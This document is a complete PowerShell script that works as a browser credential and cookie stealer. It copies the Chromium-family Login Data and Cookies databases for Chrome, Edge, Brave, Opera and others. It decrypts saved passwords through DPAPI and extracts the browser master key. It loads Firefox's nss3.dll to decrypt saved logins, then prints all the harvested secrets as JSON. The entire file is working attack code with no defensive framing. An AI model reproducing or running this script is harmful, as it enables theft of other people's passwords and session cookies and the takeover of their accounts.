# Add-Type -assembly System.Security
[System.reflection.assembly]::LoadWithPartialName("System.Security") > $null
[System.reflection.assembly]::LoadWithPartialName("System.IO") > $null
function DynamicLoadDll {
    Param ($dllName, $methodName)
    $UnsafeNativeMethods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    return $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($UnsafeNativeMethods.GetMethod('GetModuleHandle')).Invoke($null, @($dllName)))), $methodName))
}
Function Get-DelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $False)] [Type[]] $parameters,
        [Parameter(Position = 1)] [Type] $returnType = [Void]
    )
    $MyDelegateType = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $MyDelegateType.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $parameters).SetImplementationFlags('Runtime, Managed')
    $MyDelegateType.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $returnType, $parameters).SetImplementationFlags('Runtime, Managed')
    return $MyDelegateType.CreateType()
}

# SQLite
if (-not ([System.Management.Automation.PSTypeName]'Win32').Type) {
    Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public static class Win32 {
  [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
   public static extern IntPtr GetModuleHandle(string lpModuleName);
  [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true)]
   public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
  [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true)]
   public static extern IntPtr LoadLibrary(string name);
  [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true)]
   public static extern bool FreeLibrary(IntPtr hLib);
}
'@
}
if (-not ([System.Management.Automation.PSTypeName]'WinSqlite').Type) {
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static partial class WinSqlite {
   public const Int32 OK             =   0;
   public const Int32 ERROR          =   1;
   public const Int32 BUSY           =   5;
   public const Int32 CONSTRAINT     =  19; //  Violation of SQL constraint
   public const Int32 MISUSE         =  21; //  SQLite interface was used in a undefined/unsupported way (i.e. using prepared statement after finalizing it)
   public const Int32 RANGE          =  25; //  Out-of-range index in sqlite3_bind_…() or sqlite3_column_…() functions.
   public const Int32 ROW            = 100; //  sqlite3_step() has another row ready
   public const Int32 DONE           = 101; //  sqlite3_step() has finished executing
   public const Int32 INTEGER        =  1;
   public const Int32 FLOAT          =  2;
   public const Int32 TEXT           =  3;
   public const Int32 BLOB           =  4;
   public const Int32 NULL           =  5;
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_open")]
    public static extern IntPtr open(
     //   [MarshalAs(UnmanagedType.LPStr)]
           String zFilename,
       ref IntPtr ppDB       // db handle
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_exec"
// , CharSet=CharSet.Ansi
   )]
    public static extern IntPtr exec (
           IntPtr db      ,    /* An open database                                               */
//         String sql     ,    /* SQL to be evaluated                                            */
           IntPtr sql     ,    /* SQL to be evaluated                                            */
           IntPtr callback,    /* int (*callback)(void*,int,char**,char**) -- Callback function  */
           IntPtr cb1stArg,    /* 1st argument to callback                                       */
       ref String errMsg       /* Error msg written here  ( char **errmsg)                       */
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_errmsg" , CharSet=CharSet.Ansi)]
    public static extern IntPtr errmsg (
           IntPtr    db
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_prepare_v2", CharSet=CharSet.Ansi)]
    public static extern IntPtr prepare_v2 (
           IntPtr db      ,     /* Database handle                                                  */
           String zSql    ,     /* SQL statement, UTF-8 encoded                                     */
           IntPtr nByte   ,     /* Maximum length of zSql in bytes.                                 */
      ref  IntPtr sqlite3_stmt, /* int **ppStmt -- OUT: Statement handle                            */
           IntPtr pzTail        /*  const char **pzTail  --  OUT: Pointer to unused portion of zSql */
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_bind_int")]
    public static extern IntPtr bind_int(
           IntPtr           stmt,
           IntPtr /* int */ index,
           IntPtr /* int */ value);
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_bind_int64")]
    public static extern IntPtr bind_int64(
           IntPtr           stmt,
           IntPtr /* int */ index,  // TODO: Is IntPtr correct?
           Int64            value);
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_bind_double")]
    public static extern IntPtr bind_double (
           IntPtr           stmt,
           IntPtr           index,
           Double           value
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_bind_text")]
    public static extern IntPtr bind_text(
           IntPtr    stmt,
           IntPtr    index,
//        [MarshalAs(UnmanagedType.LPStr)]
           IntPtr    value , /* const char*                  */
           IntPtr    x     , /* What does this parameter do? */
           IntPtr    y       /* void(*)(void*)               */
     );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_bind_blob")]
    public static extern IntPtr bind_blob(
           IntPtr    stmt,
           Int32     index,
           IntPtr    value,
           Int32     length,   // void*
           IntPtr    funcPtr   // void(*)(void*)
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_bind_null")]
    public static extern IntPtr bind_null (
           IntPtr    stmt,
           IntPtr    index
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_step")]
    public static extern IntPtr step (
           IntPtr    stmt
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_reset")]
    public static extern IntPtr reset (
           IntPtr    stmt
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_count")]
    public static extern Int32 column_count ( // Int32? IntPtr? Int64?
            IntPtr   stmt
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_type")] // Compare with sqlite3_column_decltype()
    public static extern IntPtr column_type (
            IntPtr   stmt,
            Int32    index
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_double")]
    public static extern Double column_double (
            IntPtr   stmt,
            Int32    index
   );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_int")] // TODO: should not generally sqlite3_column_int64 be used?
    public static extern IntPtr column_int(
            IntPtr   stmt,
            Int32    index
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_int64")]
    public static extern Int64 column_int64(
            IntPtr   stmt,
            Int32    index
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_text"
//   , CharSet=CharSet.Ansi
    )]
// [return: MarshalAs(UnmanagedType.LPStr)]
    public static extern IntPtr column_text (
            IntPtr   stmt,
            Int32    index
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_blob"
    )]
    public static extern IntPtr column_blob (
            IntPtr   stmt,
            Int32    index
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_bytes"
    )]
    public static extern Int32  column_bytes (
            IntPtr   stmt,
            Int32    index
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_finalize")]
    public static extern IntPtr finalize (
           IntPtr    stmt
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_close")]
    public static extern IntPtr close (
           IntPtr    db
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_last_insert_rowid")]
    public static extern Int64 last_insert_rowid (
           IntPtr    db
    );
   [DllImport("winsqlite3.dll", EntryPoint="sqlite3_next_stmt")]
    public static extern IntPtr next_stmt (
           IntPtr    db,
           IntPtr    stmt
    );
// [DllImport("winsqlite3.dll")]
//   public static extern IntPtr sqlite3_clear_bindings(
//          IntPtr    stmt
//  );
}
"@
}

iex @'
function utf8PointerToStr([IntPtr]$charPtr) {
  [OutputType([String])]
 #
 # Create a .NET/PowerShell string from the bytes
 # that are pointed at by $charPtr
 #
   [IntPtr] $i = 0
   [IntPtr] $len = 0

   while ( [Runtime.InteropServices.Marshal]::ReadByte($charPtr, $len) -gt 0 ) {
     $len=$len+1
   }
   [byte[]] $byteArray = new-object byte[] $len

   while ( [Runtime.InteropServices.Marshal]::ReadByte($charPtr, $i) -gt 0 ) {
      $byteArray[$i] = [Runtime.InteropServices.Marshal]::ReadByte($charPtr, $i)
       $i=$i+1
   }

   return [System.Text.Encoding]::UTF8.GetString($byteArray)
}

function pointerToByteArray([IntPtr]$blobPtr, [Int32]$len) {
  [OutputType([Byte[]])]

  [byte[]] $byteArray = new-object byte[] $len

   for ($i = 0; $i -lt $len; $i++) {
      $byteArray[$i] = [Runtime.InteropServices.Marshal]::ReadByte($blobPtr, $i)
   }

 #
 # The comma between the return statement and the
 # $byteArray variable makes sure that a byte
 # array is returned rather than an array of objects.
 # See https://stackoverflow.com/a/61440166/180275
 #
   return ,$byteArray
}

function byteArrayToPointer([Byte[]] $ary) {

   [IntPtr] $heapPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($ary.Length);
   [Runtime.InteropServices.Marshal]::Copy($ary, 0, $heapPtr, $ary.Length);

   return $heapPtr
}

function strToUtf8Pointer([String] $str) {
   [OutputType([IntPtr])]
 #
 # Create a UTF-8 byte array on the unmanaged heap
 # from $str and return a pointer to that array
 #

   [Byte[]] $bytes      = [System.Text.Encoding]::UTF8.GetBytes($str);

 # Zero terminated bytes
   [Byte[]] $bytes0    = new-object 'Byte[]' ($bytes.Length + 1)
   [Array]::Copy($bytes, $bytes0, $bytes.Length)

   return byteArrayToPointer $bytes0

#  [IntPtr] $heapPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($bytes0.Length);
#  [Runtime.InteropServices.Marshal]::Copy($bytes0, 0, $heapPtr, $bytes0.Length);

#  return $heapPtr
}

function SqliteDBOpen([String] $dbFileName){
  [OutputType([IntPtr])]
  [IntPtr] $db_ = 0
  $res = [WinSqlite]::open($dbFileName, [ref] $db_)
  if ($res -ne [WinSqlite]::OK) {
    throw "Could not open $dbFileName"
  }
  return $db_
}

function SqliteDBclose([IntPtr] $db) {
  [OutputType([void])]

  $openStmtHandles = new-object System.Collections.Generic.List[IntPtr]

  [IntPtr] $openStmtHandle = 0
  while ( ($openStmtHandle = [WinSqlite]::next_stmt($db, $openStmtHandle)) -ne 0) {
      $openStmtHandles.add($openStmtHandle)
  }
  foreach ($openStmtHandle in $openStmtHandles) {
      $res = [WinSqlite]::finalize($openStmtHandle)
      if ($res -ne [WinSqlite]::OK) {
          throw "sqliteFinalize: res = $res"
      }
  }

  $res = [WinSqlite]::close($db)

  if ($res -ne [WinSqlite]::OK) {

      if ($res -eq [WinSqlite]::BUSY) {
        write-warning "Close database: database is busy"
      }
      else {
        write-warning "Close database: $res"
        write-warning (utf8PointerToStr ([WinSqlite]::errmsg($db)))
      }
      write-error (utf8PointerToStr ([WinSqlite]::errmsg($db)))
      throw "Could not close database"
  }
}


function SqliteStmtPrepare([IntPtr] $db, [String] $sql) {
  [OutputType([IntPtr])]
  [IntPtr] $handle_ = 0
  $res = [WinSqlite]::prepare_v2($db, $sql, -1, [ref] $handle_, 0)
  if ($res -ne [WinSqlite]::OK) {
      write-warning "prepareStmt: sqlite3_prepare failed, res = $res"
      write-warning (utf8PointerToStr ([WinSqlite]::errmsg($db)))
      return $null
  }
  return $handle_
}

function SqliteStmtStep([IntPtr] $handle) {
  [OutputType([IntPtr])]
  $res = [WinSqlite]::step($handle)
  return $res
}

function SqliteStmtCol(
    [IntPtr] $handle,
    [Int] $index
) {
  [OutputType([object])]

  $colType = [WinSqlite]::column_type($handle, $index)
  switch ($colType) {

      ([WinSqlite]::INTEGER) {
      #
      # Be safe and return a 64-bit integer because there does
      # not seem a way to determine if a 32 or 64-bit integer
      # was inserted.
      #
        return [WinSqlite]::column_int64($handle, $index)
      }
      ([WinSqlite]::FLOAT)   {
        return [WinSqlite]::column_double($handle, $index)
      }
      ([WinSqlite]::TEXT)    {
        [IntPtr] $charPtr = [WinSqlite]::column_text($handle, $index)
        return utf8PointerToStr $charPtr
      }
      ([WinSqlite]::BLOB)   {

        [IntPtr] $blobPtr = [WinSqlite]::column_blob($handle, $index)
        return pointerToByteArray $blobPtr [WinSqlite]::column_bytes($handle, $index)
      }
      ([WinSqlite]::NULL)    {
        return $null
      }
      default           {
        throw "This should not be possible $([WinSqlite]::sqlite3_column_type($handle, $index))"
      }
  }
  return $null
}

function SqliteStmtfinalize([IntPtr] $handle) {
  [OutputType([void])]
  $res = [WinSqlite]::finalize($handle)

  if ($res -ne [WinSqlite]::OK) {
      throw "sqliteFinalize: res = $res"
  }
}

'@

Function Convert-HexToByteArray {
    [cmdletbinding()]
    param(
        [parameter(Mandatory=$true)]
        [String]
        $HexString
    )

    $Bytes = [byte[]]::new($HexString.Length / 2)
    For($i=0; $i -lt $HexString.Length; $i+=2){
        $Bytes[$i/2] = [convert]::ToByte($HexString.Substring($i, 2), 16)
    }
    $Bytes
}

# $hexdecKey = ($decKey | ForEach-Object ToString X2) -join '' #Convert byte[] to hex
Function Convert-ByteArrayToHex {
    [cmdletbinding()]
    param(
        [parameter(Mandatory=$true)]
        [Byte[]]
        $Bytes
    )
    $HexString = [System.Text.StringBuilder]::new($Bytes.Length * 2)
    ForEach($byte in $Bytes){
        $HexString.AppendFormat("{0:x2}", $byte) > $null
    }
    $HexString.ToString()
}

function Read-ChromiumLCData {
    param (
        $master_key,
        $path,
        $query
    )

    $_rows = New-Object 'System.Collections.ArrayList'
    $sDatabasePath="$env:LocalAppData\SQLiteData"
    copy-item "$path" "$sDatabasePath"


    [IntPtr] $db = SqliteDBOpen $sDatabasePath
    [IntPtr] $stmt = SqliteStmtPrepare $db $query

    if (-not $stmt) {
        return @()
    }

    while ( (SqliteStmtStep $stmt) -ne [WinSqlite]::DONE ) {
        try {
            $encrypted_data = SqliteStmtCol $stmt 2
            if ($encrypted_data.StartsWith("763130") -or $encrypted_data.StartsWith("763131") -or $encrypted_data.StartsWith("76313")) {
                # v10, v11, v1x
                # Ciphertext bytes run 0-2="V10"; 3-14=12_byte_IV; 15 to len-17=payload; final-16=16_byte_auth_tag

                # $encrypted_data = Convert-HexToByteArray $encrypted_data
                # [byte[]]$signature = $encrypted_data[0..2]
                # [byte[]]$iv = $encrypted_data[3..14]
                # [byte[]]$encData = $encrypted_data[15..($encrypted_data.Length-1-16)]
                # [byte[]]$auth_tag = $encrypted_data[-16..-1]

                # [byte[]]$auth_tag = $encrypted_data[($encrypted_data.Length-16)..($encrypted_data.Length-1)]

                # Write-Host "SIGNATURE: $signature"
                # Write-Host "IV: $iv"
                # Write-Host "EncData: $encData"
                # Write-Host "Auth Tag: $auth_tag"

                [void]$_rows.Add(@(
                    (SqliteStmtCol $stmt 0),
                    (SqliteStmtCol $stmt 1),
                    $encrypted_data
                    # [System.Convert]::ToBase64String($encrypted_data)
                ))
                continue
            }
            if ($encrypted_data.StartsWith("01000000")) {
                $encrypted_data = Convert-HexToByteArray $encrypted_data
                $UnprotectScope = [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                $decrypted_data = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted_data, $null, $UnprotectScope)
                $decrypted_data = [System.Text.Encoding]::ASCII.GetString($decrypted_data)
                [void]$_rows.Add(@(
                    (SqliteStmtCol $stmt 0),
                    (SqliteStmtCol $stmt 1),
                    $decrypted_data
                    # [System.Convert]::ToBase64String($encrypted_data)
                ))
                continue
            }
            [void]$_rows.Add(@(
                (SqliteStmtCol $stmt 0),
                (SqliteStmtCol $stmt 1),
                $encrypted_data
                # [System.Convert]::ToBase64String($encrypted_data)
            ))
        }catch{$_}
    }

    SqliteStmtfinalize $stmt > $null
    SqliteDBclose $db > $null

    Remove-Item -path "$sDatabasePath" 2> $null

    return $_rows
}

function Read-ChromiumLocalState {
    param (
        $path
    )

    $localStateFile = "$env:LocalAppData\ChromiumLocalState"
    copy-item "$path" "$localStateFile"
    $encrypted_key = [System.Convert]::FromBase64String((Select-String -Path "$localStateFile" '"encrypted_key":"([^"]+?)"' -AllMatches | Foreach-Object {$_.Matches} | Foreach-Object {$_.Groups[1].Value}))
    Remove-Item -path "$localStateFile" 2> $null

    $UnprotectScope = [System.Security.Cryptography.DataProtectionScope]::CurrentUser
    $decrypted_key = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted_key[5..$encrypted_key.length], $null, $UnprotectScope)
    return [System.Convert]::ToBase64String($decrypted_key)
}

$data = [ordered]@{}

# Chromium
# https://chromium.googlesource.com/chromium/src/+/HEAD/docs/user_data_dir.md
$chrome = @("Chrome", "Chrome Beta", "Chrome SxS")
$chromiumPaths = @()
foreach($_item in $chrome) {
    $chromiumPaths += "$env:LocalAppData\Google\$_item"
}

# Untested
$chromiumPaths += "$env:LocalAppData\Chromium"
$chromiumPaths += "$env:AppData\Opera Software\Opera Stable"
$chromiumPaths += "$env:AppData\Opera Software\Opera GX Stable"
$chromiumPaths += "$env:LocalAppData\Microsoft\Edge"
$chromiumPaths += "$env:LocalAppData\CocCoc\Browser"
$chromiumPaths += "$env:LocalAppData\BraveSoftware\Brave-Browser"
$chromiumPaths += "$env:LocalAppData\Yandex\YandexBrowser"
$chromiumPaths += "$env:LocalAppData\Tencent\QQBrowser"

foreach ($chromiumPath in $chromiumPaths) {
    if ( -not (Test-Path -Path "$chromiumPath") ) {
        continue
    }
    $data[$chromiumPath] = @{}
    try{
        # Read local state data
        $data[$chromiumPath]['decrypted_key'] = Read-ChromiumLocalState -path "$chromiumPath\User Data\Local State"
    }catch{$_}

    # Read dir
    $folders = Get-ChildItem -Name -Directory "$chromiumPath\User Data"
    foreach ($_folder in $folders) {
        $folder = $_folder.ToLower()
        if (-not ($folder -eq "default" -or $folder.StartsWith("profile "))) {
            continue
        }
        $data[$chromiumPath][$_folder] = [ordered]@{}
        try {
            # Read logins data
            $data[$chromiumPath][$_folder]['logins'] = Read-ChromiumLCData -master_key "$data['decrypted_key']" -path "$chromiumPath\User Data\$_folder\Login Data" -query 'select origin_url,username_value,hex(password_value) from logins'
        }catch{$_}
        try {
            # Read cookies data
            $data[$chromiumPath][$_folder]['cookies'] = Read-ChromiumLCData -master_key "$data['decrypted_key']" -path "$chromiumPath\User Data\$_folder\Cookies" -query 'select host_key,name,hex(encrypted_value) from cookies'
        }catch{$_}
    }

}
# Firefox decryptor
try {
    # Load nss3.dll
    $nssdllhandle = [IntPtr]::Zero

    $mozillapaths = $(
        "$env:HOMEDRIVE\Program Files\Mozilla Firefox",
        "$env:HOMEDRIVE\Program Files (x86)\Mozilla Firefox",
        "$env:HOMEDRIVE\Program Files\Nightly",
        "$env:HOMEDRIVE\Program Files (x86)\Nightly"
    )

    $mozillapath = ""
    foreach ($p in $mozillapaths) {
        if (Test-Path -path "$p\nss3.dll") {
            $mozillapath = $p
            break
        }
    }

    if ( ("$mozillapath" -ne "") -and (Test-Path -path "$mozillapath") ) {
        $nss3dll = "$mozillapath\nss3.dll"
        $mozgluedll = "$mozillapath\mozglue.dll"
        $msvcr120dll = "$mozillapath\msvcr120.dll"
        $msvcp120dll = "$mozillapath\msvcp120.dll"
        if(Test-Path $msvcr120dll) {
            $msvcr120dllHandle = [Win32]::LoadLibrary($msvcr120dll)
            $LastError= [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose "Last Error when loading msvcr120.dll: $LastError"
        }

        if(Test-Path $msvcp120dll) {
            $msvcp120dllHandle = [Win32]::LoadLibrary($msvcp120dll) 
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose "Last Error loading msvcp120.dll: $LastError" 
        }

        if(Test-Path $mozgluedll) {
            $mozgluedllHandle = [Win32]::LoadLibrary($mozgluedll) 
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose "Last error loading mozglue.dll: $LastError"
        }
        
        if(Test-Path $nss3dll) {
            $nssdllhandle = [Win32]::LoadLibrary($nss3dll)
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose "Last Error loading nss3.dll: $LastError"       
        }
    }
    if(($nssdllhandle -eq 0) -or ($nssdllhandle -eq [IntPtr]::Zero)) {
        Write-Verbose "Last Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        Throw "Could not load nss3.dll"
    }
    # /Load nss3.dll

    # Create the ModuleBuilder
    $DynAssembly = New-Object System.Reflection.AssemblyName('NSSLib')
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('NSSLib', $False)

    # Define SecItem Struct
    $StructAttributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $StructBuilder = $ModuleBuilder.DefineType('SecItem', $StructAttributes, [System.ValueType])
    $StructBuilder.DefineField('type', [int], 'Public') > $null
    $StructBuilder.DefineField('data', [IntPtr], 'Public') > $null
    $StructBuilder.DefineField('len', [int], 'Public') > $null
    $SecItemType = $StructBuilder.CreateType()

    # $NSS_Init = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((DynamicLoadDll "$mozillapath\nss3.dll" NSS_Init), (Get-DelegateType @([string]) ([long])))
    $NSS_Init = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([Win32]::GetProcAddress($nssdllhandle, "NSS_Init"), (Get-DelegateType @([string]) ([long])))
    $NSS_Shutdown = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([Win32]::GetProcAddress($nssdllhandle, "NSS_Shutdown"), (Get-DelegateType @() ([long])))

    $PK11_GetInternalKeySlot = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([Win32]::GetProcAddress($nssdllhandle, "PK11_GetInternalKeySlot"), (Get-DelegateType @() ([long])))
    $PK11_FreeSlot = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([Win32]::GetProcAddress($nssdllhandle, "PK11_FreeSlot"), (Get-DelegateType @([long]) ([void])))
    $PK11_Authenticate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([Win32]::GetProcAddress($nssdllhandle, "PK11_Authenticate"), (Get-DelegateType @([long], [bool], [int]) ([long])))

    $PK11SDR_Decrypt = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([Win32]::GetProcAddress($nssdllhandle, "PK11SDR_Decrypt"), (Get-DelegateType @([Type]$SecItemType.MakeByRefType(),[Type]$SecItemType.MakeByRefType(), [int]) ([int])))

}catch{
    $_
}

# https://github.com/Leslie-Shang/Browser_Decrypt/blob/master/Browser_Decrypt/Firefox_Decrypt.cpp
# https://github.com/techchrism/firefox-password-decrypt/blob/master/ConvertFrom-NSS.ps1
Function FFDecrypt-CipherText {
    param (
        [parameter(Mandatory=$True)]
        [string]$cipherText
    )
    $dataStr = ""
    $slot = $PK11_GetInternalKeySlot.Invoke()
    try{
        if ($PK11_Authenticate.Invoke($slot, $true, 0) -eq 0) {
            # Decode data into bytes and marshal them into a pointer
            $dataBytes = [System.Convert]::FromBase64String($cipherText)
            $dataPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($dataBytes.Length)
            [System.Runtime.InteropServices.Marshal]::Copy($dataBytes, 0, $dataPtr, $dataBytes.Length) > $null

            # Set up structures
            $encrypted = [Activator]::CreateInstance($SecItemType)
            $encrypted.type = 0
            $encrypted.data = $dataPtr
            $encrypted.len = $dataBytes.Length

            $decrypted = [Activator]::CreateInstance($SecItemType)
            $decrypted.type = 0
            $decrypted.data = [IntPtr]::Zero
            $decrypted.len = 0

            $PK11SDR_Decrypt.Invoke([ref] $encrypted, [ref] $decrypted, 0) > $null

            # Get string data back out
            $bytePtr = $decrypted.data
            $byteData = [byte[]]::new($decrypted.len)
            [System.Runtime.InteropServices.Marshal]::Copy($bytePtr, $byteData, 0, $decrypted.len) > $null
            $dataStr = [System.Text.Encoding]::UTF8.GetString($byteData)
        }
    }catch{$_}
    $PK11_FreeSlot.Invoke($slot) > $null
    return $dataStr
}
# /Firefox decryptor

# Firefox
function Read-FirefoxCookies {
    param (
        $path
    )
    $_rows = New-Object 'System.Collections.ArrayList'
    $sDatabasePath="$env:LocalAppData\SQLiteData"
    copy-item "$path" "$sDatabasePath"

    $db = SqliteDBOpen $sDatabasePath
    $stmt = SqliteStmtPrepare $db "select host,name,value from moz_cookies"

    if (-not $stmt) {
        return @();
    }

    while ( (SqliteStmtStep $stmt)  -ne [WinSqlite]::DONE ) {
        [void]$_rows.Add(@(
            (SqliteStmtCol $stmt 0),
            (SqliteStmtCol $stmt 1),
            (SqliteStmtCol $stmt 2)
        ))
    }

    SqliteStmtfinalize $stmt > $null
    SqliteDBclose $db > $null

    Remove-Item -path "$sDatabasePath" 2> $null

    return $_rows
}

function Read-FirefoxLogins {
    param (
        $path
    )
    $_rows = New-Object 'System.Collections.ArrayList'

    $json = Get-Content "$path" | Out-String | ConvertFrom-Json
    foreach ($login in $json.logins) {
        $_item = @($login.hostname, "deuser err", "depass err", $login.formSubmitURL)
        try{
            $_item[1] = (FFDecrypt-CipherText $login.encryptedUsername)
        }catch{$_}
        try{
            $_item[2] = (FFDecrypt-CipherText $login.encryptedPassword)
        }catch{$_}
        $_rows.Add($_item) > $null
    }
    return $_rows
}

# Read dir
if (( -not ( ($nssdllhandle -eq 0) -or ($nssdllhandle -eq [IntPtr]::Zero) ) ) -and (Test-Path -path "$env:AppData\Mozilla\Firefox\Profiles") ) {
    $firefoxData = @{}
    $folders = Get-ChildItem -Name -Directory "$env:AppData\Mozilla\Firefox\Profiles"
    foreach ($_folder in $folders) {
        $NSSInitResult = $NSS_Init.Invoke("$env:AppData\Mozilla\Firefox\Profiles\$_folder")
        if ($NSSInitResult -ne 0) {
            Write-Warning "Could not init nss3.dll"
            continue
        }

        $firefoxData[$_folder] = @{}
        try{
            $firefoxData[$_folder]['cookies'] = Read-FirefoxCookies -path "$env:AppData\Mozilla\Firefox\Profiles\$_folder\cookies.sqlite"
        }catch{$_}
        try{
            $firefoxData[$_folder]['logins'] = Read-FirefoxLogins -path "$env:AppData\Mozilla\Firefox\Profiles\$_folder\logins.json"
        }catch{$_}
        # NSS_Shutdown
        $NSS_Shutdown.Invoke() > $null
    }
    $data['Firefox'] = $firefoxData

    if ($nssdllhandle) {
        [Win32]::FreeLibrary($nssdllhandle) > $null
    }
    if ($mozgluedllHandle) {
        [Win32]::FreeLibrary($mozgluedllHandle) > $null
    }
    if ($msvcp120dllHandle) {
        [Win32]::FreeLibrary($msvcp120dllHandle) > $null
    }
    if ($msvcr120dllHandle) {
        [Win32]::FreeLibrary($msvcr120dllHandle) > $null
    }
}
# Firefox

$data | ConvertTo-Json -Depth 9 -Compress
